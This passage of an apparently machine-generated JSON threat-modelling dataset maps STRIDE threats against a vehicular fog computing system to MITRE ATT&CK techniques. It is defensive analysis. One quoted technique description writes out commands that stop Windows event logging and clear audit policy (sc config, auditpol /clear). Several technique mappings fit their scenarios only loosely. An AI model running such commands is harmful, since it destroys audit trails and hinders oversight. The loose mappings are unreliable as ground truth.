                    "Assumption": "Cloud services are accessible from public networks without adequate protections.",
                    "Role": "Attacker",
                    "Condition": "Valid if external access controls are weak."
                },
                {
                    "Assumption": "No DDoS mitigation strategies are in place for cloud services.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Valid if DDoS protections are absent."
                },
                {
                    "Assumption": "Critical functions of cloud services are not distributed or redundant.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Valid if critical services lack redundancy."
                }
            ],
            "Potential Impact": "Service unavailability impacts data processing and access, degrading overall system performance.",
            "MITRE ATT&CK Keywords": [
                "DDoS",
                "cloud services",
                "service disruption",
                "availability"
            ],
            "mitre_technique": {
                "name": "Direct Network Flood",
                "description": "Adversaries may attempt to cause a denial of service (DoS) by directly sending a high-volume of network traffic to a target. This DoS attack may also reduce the availability and functionality of the targeted system(s) and network. [Direct Network Flood](https://attack.mitre.org/techniques/T1498/001)s are when one or more systems are used to send a high-volume of network packets towards the targeted service's network. Almost any network protocol may be used for flooding. Stateless protocols such as UDP or ICMP are commonly used but stateful protocols such as TCP can be used as well.\n\nBotnets are commonly used to conduct network flooding attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global Internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for distributed DoS (DDoS), so many systems are used to generate the flood that each one only needs to send out a small amount of traffic to produce enough volume to saturate the target network. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS flooding attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)",
                "id": "attack-pattern--0bda01d5-4c1d-4062-8ee2-6872334383c3",
                "technique_id": "T1498.001"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker exploits a software vulnerability on fog nodes to gain elevated access and control over the system.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes run software with vulnerabilities that can be exploited for privilege escalation.",
                    "Role": "Attacker",
                    "Condition": "Valid if software has known or unknown vulnerabilities."
                },
                {
                    "Assumption": "No privilege segregation or least privilege enforcement on fog node operations.",
                    "Role": "Systems",
                    "Condition": "Valid if access controls are insufficient."
                },
                {
                    "Assumption": "Attackers have the ability to execute arbitrary code on fog nodes.",
                    "Role": "Attacker",
                    "Condition": "Valid if execution controls are weak."
                }
            ],
            "Potential Impact": "Unauthorized control over fog nodes, leading to potential data manipulation or service disruption.",
            "MITRE ATT&CK Keywords": [
                "privilege escalation",
                "vulnerability exploitation",
                "fog nodes",
                "system control"
            ],
            "mitre_technique": {
                "name": "File System Permissions Weakness",
                "description": "Processes may automatically execute specific binaries as part of their functionality or to perform other actions. If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process. If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions, which could include SYSTEM.\n\nAdversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level. If the executing process is set to run at a specific time or during a certain event (e.g., system bootup) then this technique can also be used for persistence.\n\n### Services\n\nManipulation of Windows service binaries is one variation of this technique. Adversaries may replace a legitimate service executable with their own executable to gain persistence and/or privilege escalation to the account context the service is set to execute under (local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is started, either directly by the user (if appropriate access is available) or through some other means, such as a system restart if the service starts on bootup, the replaced executable will run instead of the original service executable.\n\n### Executable Installers\n\nAnother variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers. During the installation process, it is common for installers to use a subdirectory within the <code>%TEMP%</code> directory to unpack binaries such as DLLs, EXEs, or other payloads. When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process. This behavior is related to and may take advantage of [DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require elevated privileges that will result in privilege escalation when executing adversary controlled code. This behavior is related to [Bypass User Account Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in existing common installers have been reported to software vendors. (Citation: Mozilla Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)",
                "id": "attack-pattern--0ca7beef-9bbc-4e35-97cf-437384ddce6a",
                "technique_id": "T1044"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker gains administrative access to cloud services through credential compromise, allowing control over sensitive data and resources.",
            "Assumptions": [
                {
                    "Assumption": "Administrative credentials are poorly managed or protected.",
                    "Role": "Attacker",
                    "Condition": "Valid if credential management is weak."
                },
                {
                    "Assumption": "Cloud services do not enforce multi-factor authentication for administrative access.",
                    "Role": "Cloud Service Provider",
                    "Condition": "Valid if MFA is not implemented."
                },
                {
                    "Assumption": "Attackers can perform reconnaissance to identify and target administrative accounts.",
                    "Role": "Attacker",
                    "Condition": "Valid if reconnaissance is unmitigated."
                }
            ],
            "Potential Impact": "Full control over cloud services, leading to potential data breaches or service manipulation.",
            "MITRE ATT&CK Keywords": [
                "credential compromise",
                "cloud services",
                "administrative access",
                "control"
            ],
            "mitre_technique": {
                "name": "Steal Web Session Cookie",
                "description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.\n\nCookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.(Citation: Pass The Cookie)\n\nThere are several examples of malware targeting cookies from web browsers on the local system.(Citation: Kaspersky TajMahal April 2019)(Citation: Unit 42 Mac Crypto Cookies January 2019) Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying on [User Execution](https://attack.mitre.org/techniques/T1204) by tricking victims into running malicious JavaScript in their browser.(Citation: Talos Roblox Scam 2023)(Citation: Krebs Discord Bookmarks 2023)\n\nThere are also open source frameworks such as `Evilginx2` and `Muraena` that can gather session cookies through a malicious proxy (e.g., [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557)) that can be set up by an adversary and used in phishing campaigns.(Citation: Github evilginx2)(Citation: GitHub Mauraena)\n\nAfter an adversary acquires a valid cookie, they can then perform a [Web Session Cookie](https://attack.mitre.org/techniques/T1550/004) technique to login to the corresponding web application.",
                "id": "attack-pattern--10ffac09-e42d-4f56-ab20-db94c67d76ff",
                "technique_id": "T1539"
            }
        },
        {
            "Threat Type": "Elevation of Privilege",
            "Scenario": "An attacker uses vulnerabilities in vehicle firmware to gain elevated privileges within the vehicular network, affecting multiple smart vehicles.",
            "Assumptions": [
                {
                    "Assumption": "Firmware vulnerabilities are not patched in a timely manner.",
                    "Role": "Attacker",
                    "Condition": "Valid if patch management is slow or inadequate."
                },
                {
                    "Assumption": "Smart vehicles do not have sufficient access control mechanisms within their network.",
                    "Role": "Systems",
                    "Condition": "Valid if internal access controls are weak."
                },
                {
                    "Assumption": "Attackers can establish persistence within vehicle systems.",
                    "Role": "Attacker",
                    "Condition": "Valid if persistence techniques are insufficiently defended."
                }
            ],
            "Potential Impact": "Compromised network integrity, leading to potential data manipulation and control over vehicle systems.",
            "MITRE ATT&CK Keywords": [
                "vehicular network",
                "firmware vulnerabilities",
                "privilege escalation",
                "network control"
            ],
            "mitre_technique": {
                "name": "Group Policy Discovery",
                "description": "Adversaries may gather information on Group Policy settings to identify paths for privilege escalation, security measures applied within a domain, and to discover patterns in domain objects that can be manipulated or used to blend in the environment. Group Policy allows for centralized management of user and computer settings in Active Directory (AD). Group policy objects (GPOs) are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016)\n\nAdversaries may use commands such as <code>gpresult</code> or various publicly available PowerShell functions, such as <code>Get-DomainGPO</code> and <code>Get-DomainGPOLocalGroup</code>, to gather information on Group Policy settings.(Citation: Microsoft gpresult)(Citation: Github PowerShell Empire) Adversaries may use this information to shape follow-on behaviors, including determining potential attack paths within the target network as well as opportunities to manipulate Group Policy settings (i.e. [Domain or Tenant Policy Modification](https://attack.mitre.org/techniques/T1484)) for their benefit.",
                "id": "attack-pattern--1b20efbf-8063-4fc3-a07d-b575318a301b",
                "technique_id": "T1615"
            }
        }
    ]
},
{
    "case_number": "11",
    "batch_number": "18",
    "threats": [
        {
            "Threat Type": "Spoofing",
            "Scenario": "An attacker spoofs a legitimate smart vehicle\u2019s credentials to gain unauthorized access to the VFC system.",
            "Assumptions": [
                {
                    "Assumption": "An authentication mechanism relies solely on identifiable attributes of the vehicle.",
                    "Role": "System Designer",
                    "Condition": "The assumed attributes are not sufficiently protected or unique."
                },
                {
                    "Assumption": "The attacker has access to the same network as the legitimate vehicle.",
                    "Role": "Attacker",
                    "Condition": "The attacker is within the communication range of the legitimate vehicle."
                },
                {
                    "Assumption": "There is no robust encryption or verification of vehicle credentials.",
                    "Role": "System Implementer",
                    "Condition": "Authentication details are transmitted in plaintext or weakly encrypted."
                }
            ],
            "Potential Impact": "Compromised confidentiality and unauthorized data access.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device",
                "authentication bypass",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "A malicious entity poses as a cloud service to intercept sensitive data exchanged with fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Trust relationships between fog nodes and cloud services are assumed but not verified.",
                    "Role": "System Architect",
                    "Condition": "There are no mechanisms to verify the authenticity of the cloud service."
                },
                {
                    "Assumption": "The attacker can position themselves between the fog node and cloud service.",
                    "Role": "Attacker",
                    "Condition": "The attacker has network access to interfere in the communication."
                },
                {
                    "Assumption": "Communication channels are not secured with proper encryption/protocols.",
                    "Role": "Security Engineer",
                    "Condition": "Communication between fog nodes and cloud services lacks strong encryption."
                }
            ],
            "Potential Impact": "Data interception leading to compromised confidentiality.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "cloud",
                "man-in-the-middle",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Spoofing",
            "Scenario": "An unauthorized device mimics a roadside unit (RSU) to send malicious traffic alerts to nearby vehicles.",
            "Assumptions": [
                {
                    "Assumption": "Vehicles trust any RSU without a verification step.",
                    "Role": "System Architect",
                    "Condition": "Vehicles accept data from RSUs without authentication."
                },
                {
                    "Assumption": "The attacker can place a device physically or wirelessly near the road.",
                    "Role": "Attacker",
                    "Condition": "The attacker has physical or network access to targeted area."
                },
                {
                    "Assumption": "RSU messages are not cryptographically signed or verified.",
                    "Role": "Security Implementer",
                    "Condition": "Messages from RSUs lack digital signatures or verifications."
                }
            ],
            "Potential Impact": "Disrupted traffic flow and potential accidents.",
            "MITRE ATT&CK Keywords": [
                "spoofing",
                "device",
                "fake data injection",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker modifies data exchanged between smart vehicles and fog nodes.",
            "Assumptions": [
                {
                    "Assumption": "Data in transit is not encrypted or integrity-protected.",
                    "Role": "System Designer",
                    "Condition": "Data transmitted between vehicles and fog nodes is sent in plain text or weakly encrypted."
                },
                {
                    "Assumption": "An attacker has access to the transmission medium.",
                    "Role": "Attacker",
                    "Condition": "The attacker is within the communication range or has network access."
                },
                {
                    "Assumption": "There are no mechanisms for detecting tampered data.",
                    "Role": "Security Engineer",
                    "Condition": "Systems lack checksums, hashes, or other integrity checks."
                }
            ],
            "Potential Impact": "Compromised data integrity leading to incorrect processing and decision-making.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "device communication",
                "data integrity",
                "network"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish an AiTM position, such as by negotiating a less secure, deprecated, or weaker version of communication protocol (SSL/TLS) or encryption algorithm.(Citation: mitm_tls_downgrade_att)(Citation: taxonomy_downgrade_att_tls)(Citation: tlseminar_downgrade_att)\n\nAdversaries may also leverage the AiTM position to attempt to monitor and/or modify traffic, such as in [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002). Adversaries can setup a position similar to AiTM to prevent traffic from flowing to the appropriate destination, potentially to [Impair Defenses](https://attack.mitre.org/techniques/T1562) and/or in support of a [Network Denial of Service](https://attack.mitre.org/techniques/T1498).",
                "id": "attack-pattern--035bb001-ab69-4a0b-9f6c-2de8b09e1b9d",
                "technique_id": "T1557"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "Malware introduced into the fog node alters traffic management processes.",
            "Assumptions": [
                {
                    "Assumption": "Fog nodes lack robust malware protection or detection systems.",
                    "Role": "Security Engineer",
                    "Condition": "Security systems on fog nodes are insufficient."
                },
                {
                    "Assumption": "The attacker has the capability to access and execute code on fog nodes.",
                    "Role": "Attacker",
                    "Condition": "The attacker gains physical or network access to fog nodes."
                },
                {
                    "Assumption": "There are exploitable vulnerabilities in the fog node systems.",
                    "Role": "System Implementer",
                    "Condition": "Fog node software has unpatched vulnerabilities."
                }
            ],
            "Potential Impact": "System integrity compromised, leading to inaccurate or malicious traffic management.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "malware",
                "system integrity",
                "network"
            ],
            "mitre_technique": {
                "name": "Disk Structure Wipe",
                "description": "Adversaries may corrupt or wipe the disk data structures on a hard drive necessary to boot a system; targeting specific critical systems or in large numbers in a network to interrupt availability to system and network resources. \n\nAdversaries may attempt to render the system unable to boot by overwriting critical data located in structures such as the master boot record (MBR) or partition table.(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)(Citation: Unit 42 Shamoon3 2018) The data contained in disk structures may include the initial executable code for loading an operating system or the location of the file system partitions on disk. If this information is not present, the computer will not be able to load an operating system during the boot process, leaving the computer unavailable. [Disk Structure Wipe](https://attack.mitre.org/techniques/T1561/002) may be performed in isolation, or along with [Disk Content Wipe](https://attack.mitre.org/techniques/T1561/001) if all sectors of a disk are wiped.\n\nOn a network devices, adversaries may reformat the file system using [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `format`.(Citation: format_cmd_cisco)\n\nTo maximize impact on the target organization, malware designed for destroying disk structures may have worm-like features to propagate across a network by leveraging other techniques like [Valid Accounts](https://attack.mitre.org/techniques/T1078), [OS Credential Dumping](https://attack.mitre.org/techniques/T1003), and [SMB/Windows Admin Shares](https://attack.mitre.org/techniques/T1021/002).(Citation: Symantec Shamoon 2012)(Citation: FireEye Shamoon Nov 2016)(Citation: Palo Alto Shamoon Nov 2016)(Citation: Kaspersky StoneDrill 2017)",
                "id": "attack-pattern--0af0ca99-357d-4ba1-805f-674fdfb7bef9",
                "technique_id": "T1561.002"
            }
        },
        {
            "Threat Type": "Tampering",
            "Scenario": "An attacker manipulates the firmware of an RSU causing it to process and relay incorrect information.",
            "Assumptions": [
                {
                    "Assumption": "RSU firmware is updatable remotely and is not properly secured.",
                    "Role": "System Designer",
                    "Condition": "Firmware lacks robust authentication or verification mechanisms."
                },
                {
                    "Assumption": "The attacker has the capability to intercept or inject firmware updates.",
                    "Role": "Attacker",
                    "Condition": "The attacker has access to the firmware update pipeline."
                },
                {
                    "Assumption": "There are firmware vulnerabilities that can be exploited.",
                    "Role": "System Implementer",
                    "Condition": "RSU firmware contains security flaws."
                }
            ],
            "Potential Impact": "Compromised data integrity and disrupted traffic management.",
            "MITRE ATT&CK Keywords": [
                "tampering",
                "firmware",
                "device integrity",
                "network"
            ],
            "mitre_technique": {
                "name": "Component Firmware",
                "description": "Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar to [System Firmware](https://attack.mitre.org/techniques/T1019) but conducted upon other system components that may not have the same capability or level of integrity checking. Malicious device firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
                "id": "attack-pattern--10d5f3b7-6be6-4da5-9a77-0f1e2bbfcc44",
                "technique_id": "T1109"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "A user denies having sent certain critical data from a smart vehicle, impacting accountability.",
            "Assumptions": [
                {
                    "Assumption": "There is no non-repudiation mechanism in place.",
                    "Role": "System Designer",
                    "Condition": "Systems lack digital signatures or logging mechanisms."
                },
                {
                    "Assumption": "The system allows for reasonably untraceable interactions.",
                    "Role": "Security Engineer",
                    "Condition": "Activities are not logged or monitored sufficiently."
                },
                {
                    "Assumption": "There is a lack of user authentication tying actions to individuals.",
                    "Role": "System Implementer",
                    "Condition": "The system doesn't ensure that actions are tied to identifiable users."
                }
            ],
            "Potential Impact": "Loss of data integrity due to lack of accountability.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "accountability",
                "user actions"
            ],
            "mitre_technique": {
                "name": "Disable Windows Event Logging",
                "description": "Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits. Windows event logs record user and system activity such as login attempts, process creation, and much more.(Citation: Windows Log Events) This data is used by security tools and analysts to generate detections.\n\nThe EventLog service maintains event logs from various system components and applications.(Citation: EventLog_Core_Technologies) By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to <code>Security Settings\\Local Policies\\Audit Policy</code> for basic audit policy settings or <code>Security Settings\\Advanced Audit Policy Configuration</code> for advanced audit policy settings.(Citation: Audit_Policy_Microsoft)(Citation: Advanced_sec_audit_policy_settings) <code>auditpol.exe</code> may also be used to set audit policies.(Citation: auditpol)\n\nAdversaries may target system-wide logging or just that of a particular application. For example, the Windows EventLog service may be disabled using the <code>Set-Service -Name EventLog -Status Stopped</code> or <code>sc config eventlog start=disabled</code> commands (followed by manually stopping the service using <code>Stop-Service  -Name EventLog</code>).(Citation: Disable_Win_Event_Logging)(Citation: disable_win_evt_logging) Additionally, the service may be disabled by modifying the \u201cStart\u201d value in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\EventLog</code> then restarting the system for the change to take effect.(Citation: disable_win_evt_logging)\n\nThere are several ways to disable the EventLog service via registry key modification. First, without Administrator privileges, adversaries may modify the \"Start\" value in the key <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Security</code>, then reboot the system to disable the Security EventLog.(Citation: winser19_file_overwrite_bug_twitter) Second, with Administrator privilege, adversaries may modify the same values in <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-System</code> and <code>HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\WMI\\Autologger\\EventLog-Application</code> to disable the entire EventLog.(Citation: disable_win_evt_logging)\n\nAdditionally, adversaries may use <code>auditpol</code> and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the <code>/success</code> or <code>/failure</code> parameters. For example, <code>auditpol /set /category:\u201dAccount Logon\u201d /success:disable /failure:disable</code> turns off auditing for the Account Logon category.(Citation: auditpol.exe_STRONTIC)(Citation: T1562.002_redcanaryco) To clear the audit policy, adversaries may run the following lines: <code>auditpol /clear /y</code> or <code>auditpol /remove /allusers</code>.(Citation: T1562.002_redcanaryco)\n\nBy disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind.",
                "id": "attack-pattern--4eb28bed-d11a-4641-9863-c2ac017d910a",
                "technique_id": "T1562.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "An attacker alters logs on a fog node to cover tracks of their malicious activities.",
            "Assumptions": [
                {
                    "Assumption": "Logs are stored locally on the fog node without extra security.",
                    "Role": "System Designer",
                    "Condition": "Logs are stored in a modifiable and unsecured format."
                },
                {
                    "Assumption": "The attacker has administrative or privileged access to the fog node.",
                    "Role": "Attacker",
                    "Condition": "The attacker gains or escalates privileges on the fog node."
                },
                {
                    "Assumption": "Logging system lacks tamper-evident mechanisms.",
                    "Role": "Security Engineer",
                    "Condition": "Logs do not have checksums, digital signatures, or other protections."
                }
            ],
            "Potential Impact": "Compromised integrity of system logs, hindering forensic investigations.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "logging",
                "log tampering",
                "system integrity"
            ],
            "mitre_technique": {
                "name": "Clear Linux or Mac System Logs",
                "description": "Adversaries may clear system logs to hide evidence of an intrusion. macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the <code>/var/log/</code> directory. Subfolders in this directory categorize logs by their related functions, such as:(Citation: Linux Logs)\n\n* <code>/var/log/messages:</code>: General and system-related messages\n* <code>/var/log/secure</code> or <code>/var/log/auth.log</code>: Authentication logs\n* <code>/var/log/utmp</code> or <code>/var/log/wtmp</code>: Login records\n* <code>/var/log/kern.log</code>: Kernel logs\n* <code>/var/log/cron.log</code>: Crond logs\n* <code>/var/log/maillog</code>: Mail server logs\n* <code>/var/log/httpd/</code>: Web server access and error logs\n",
                "id": "attack-pattern--2bce5b30-7014-4a5d-ade7-12913fe6ac36",
                "technique_id": "T1070.002"
            }
        },
        {
            "Threat Type": "Repudiation",
            "Scenario": "Users deny receiving critical alerts on their smart vehicles due to malicious interference.",
            "Assumptions": [
                {
                    "Assumption": "There is no proof-of-receipt mechanism for critical alerts.",
                    "Role": "System Designer",
                    "Condition": "Alerts are sent without requiring acknowledgment or logging receipt."
                },
                {
                    "Assumption": "The attacker can disrupt or interfere with the alerting system.",
                    "Role": "Attacker",
                    "Condition": "The attacker has network access to intercept or disrupt communications."
                },
                {
                    "Assumption": "Vehicles or RSUs do not log alert delivery status.",
                    "Role": "System Implementer",
                    "Condition": "No mechanism exists to verify or log that alerts were successfully delivered."
                }
            ],
            "Potential Impact": "Disruption in critical communications leading to denial or loss of data integrity.",
            "MITRE ATT&CK Keywords": [
                "repudiation",
                "alerting system",
                "authentication",
                "communication"
            ],
            "mitre_technique": {
                "name": "Adversary-in-the-Middle",
                "description": "Adversaries may attempt to position themselves between two or more networked devices using an adversary-in-the-middle (AiTM) technique to support follow-on behaviors such as [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Transmitted Data Manipulation](https://attack.mitre.org/techniques/T1565/002), or replay attacks ([Exploitation for Credential Access](https://attack.mitre.org/techniques/T1212)). By abusing features of common networking protocols that can determine the flow of network traffic (e.g. ARP, DNS, LLMNR, etc.), adversaries may force a device to communicate through an adversary controlled system so they can collect information or perform additional actions.(Citation: Rapid7 MiTM Basics)\n\nFor example, adversaries may manipulate victim DNS settings to enable other malicious activities such as preventing/redirecting users from accessing legitimate sites and/or pushing additional malware.(Citation: ttint_rat)(Citation: dns_changer_trojans)(Citation: ad_blocker_with_miner) Adversaries may also manipulate DNS and leverage their position in order to intercept user credentials, including access tokens ([Steal Application Access Token](https://attack.mitre.org/techniques/T1528)) and session cookies ([Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539)).(Citation: volexity_0day_sophos_FW)(Citation: Token tactics) [Downgrade Attack](https://attack.mitre.org/techniques/T1562/010)s can also be used to establish 